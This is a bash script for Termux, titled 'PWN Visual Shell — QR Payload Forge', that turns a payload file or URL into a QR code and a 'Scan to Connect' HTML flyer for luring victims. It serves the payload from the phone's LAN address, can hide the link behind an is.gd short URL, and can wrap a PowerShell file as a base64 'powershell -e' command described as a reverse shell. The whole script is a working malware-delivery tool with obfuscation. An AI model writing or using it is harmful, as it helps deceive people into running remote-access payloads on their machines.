#!/data/data/com.termux/files/usr/bin/bash

OUTPUT_DIR="./output"
mkdir -p "$OUTPUT_DIR"

# === Red ASCII Banner with Animation ===
clear
frames=(
"
\033[41m\033[97m
  (                   )
  )\ )   (  (      ( /(
 (()/(   )\))(   ' )\())
  /(_)) ((_)()\ ) ((_)\\
 (_))   _(())\_)() _((_)
 | _ \  \ \((_)/ /| \| |
 |  _/   \ \/\/ / | .\` |
 |_|      \_/\_/  |_|\_|

     P   W   N
\033[0m"
)

for f in "${frames[@]}"; do
    clear
    echo -e "$f"
    sleep 0.15
done

echo -e "\033[97m[ PWN Visual Shell Active — QR Payload Forge ]\033[0m"

# === Payload Input ===
read -p "[+] Enter payload URL or local file path: " PAYLOAD_INPUT

if [[ -f "$PAYLOAD_INPUT" ]]; then
    BASENAME=$(basename "$PAYLOAD_INPUT")
    cp "$PAYLOAD_INPUT" "$OUTPUT_DIR/$BASENAME"
    LAN_IP=$(ip a | grep inet | grep wlan | awk '{print $2}' | cut -d/ -f1 | head -n1)
    PAYLOAD_URL="http://$LAN_IP:8000/$BASENAME"
else
    PAYLOAD_URL="$PAYLOAD_INPUT"
fi

# === URL Shortener Option ===
read -p "[?] Shorten URL with is.gd? (y/N): " SHORTEN
if [[ "$SHORTEN" =~ ^[Yy]$ ]]; then
    SHORTENED=$(curl -s "https://is.gd/create.php?format=simple&url=$PAYLOAD_URL")
    if [[ "$SHORTENED" != "" ]]; then
        PAYLOAD_URL="$SHORTENED"
    fi
fi

# === Optional Obfuscation ===
read -p "[?] Obfuscate payload (Base64 encode + PS reverse shell)? (y/N): " CLOAK
if [[ "$CLOAK" =~ ^[Yy]$ && -f "$OUTPUT_DIR/$BASENAME" ]]; then
    ENCODED=$(base64 "$OUTPUT_DIR/$BASENAME" | tr -d '\n')
    OBF_PSH="powershell -e $ENCODED"
    OBF_NAME="${BASENAME%.ps1}_obfuscated.ps1"
    echo "$OBF_PSH" > "$OUTPUT_DIR/$OBF_NAME"
    PAYLOAD_URL="http://$LAN_IP:8000/$OBF_NAME"
fi

# === QR Code & Flyer Generation ===
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
QR_PNG="$OUTPUT_DIR/qr_payload_$TIMESTAMP.png"
HTML_OUT="$OUTPUT_DIR/flyer_$TIMESTAMP.html"

echo "[*] Generating QR code..."
python3 -c "import qrcode; img = qrcode.make('$PAYLOAD_URL'); img.save('$QR_PNG')"
python3 -c "import qrcode_terminal; qrcode_terminal.draw('$PAYLOAD_URL')"

cat <<FLYER > "$HTML_OUT"
<!DOCTYPE html>
<html>
<head><title>PWN Drop</title></head>
<body style="text-align:center; font-family:sans-serif;">
<h2>Scan to Connect</h2>
<img src="qr_payload_$TIMESTAMP.png" alt="QR Code">
<p><small>This payload link is valid for 24 hours.</small></p>
</body>
</html>
FLYER

# === Copy to Clipboard (Termux) ===
if command -v termux-clipboard-set >/dev/null 2>&1; then
    echo "$PAYLOAD_URL" | termux-clipboard-set
    echo "[*] Payload URL copied to clipboard."
fi

# === Log Output ===
echo "[$TIMESTAMP] $PAYLOAD_URL → $QR_PNG" >> "$OUTPUT_DIR/qr_log.txt"

# === Output Summary ===
echo "[✓] PNG saved to: $QR_PNG"
echo "[✓] HTML flyer saved to: $HTML_OUT"
echo "[✓] Payload URL: $PAYLOAD_URL"
